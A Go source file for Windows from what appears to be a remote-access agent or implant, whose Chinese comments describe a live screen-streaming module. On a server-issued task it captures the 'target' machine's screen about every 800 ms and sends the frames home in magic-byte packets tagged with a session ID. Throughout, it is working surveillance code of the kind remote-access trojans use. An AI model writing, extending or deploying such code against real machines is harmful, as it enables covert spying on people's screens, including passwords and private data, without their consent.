//go:build windows && !light

package main

import (
	"encoding/json"
	"sync/atomic"
	"time"
)

// ─── 实时屏幕流 ─────────────────────────────────────────────────────
// 复用截图模块的 GDI 捕获（handleScreenshot），按固定帧率循环截图并以
// TypeScreenFrame 帧回传服务端，服务端再推送到前端渲染。低帧率（约 1.25fps）
// 足以支撑远程 GUI 操作的视觉反馈，同时控制带宽与 CPU 占用。

var (
	screenStreamStop   atomic.Bool
	screenStreamActive atomic.Bool
)

func handleScreenStream(taskData string) (string, int32, string) {
	var req struct {
		Action string `json:"action"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)

	switch req.Action {
	case "stop":
		screenStreamStop.Store(true)
		screenStreamActive.Store(false)
		return "screen stream stopped", 0, ""
	default: // start
		if screenStreamActive.Load() {
			return "screen stream already running", 0, ""
		}
		screenStreamStop.Store(false)
		screenStreamActive.Store(true)
		go screenStreamLoop()
		return "screen stream started", 0, ""
	}
}

func screenStreamLoop() {
	defer screenStreamActive.Store(false)
	const interval = 800 * time.Millisecond
	consecFail := 0
	for !screenStreamStop.Load() {
		out, code, _ := handleScreenshot("")
		if code == 0 && out != "" {
			consecFail = 0
			sendScreenFrame(out)
		} else {
			consecFail++
			// 连续失败（老系统无交互桌面/锁屏等）时回传一次错误帧，前端可提示
			if consecFail == 3 {
				sendScreenFrame(`{"error":"屏幕捕获连续失败，目标可能锁屏/无交互桌面（Headless 服务器）"}`)
			}
		}
		time.Sleep(interval)
	}
}

func sendScreenFrame(imageJSON string) {
	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeScreenFrame,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(imageJSON),
	}
	sendPacket(packet)
}
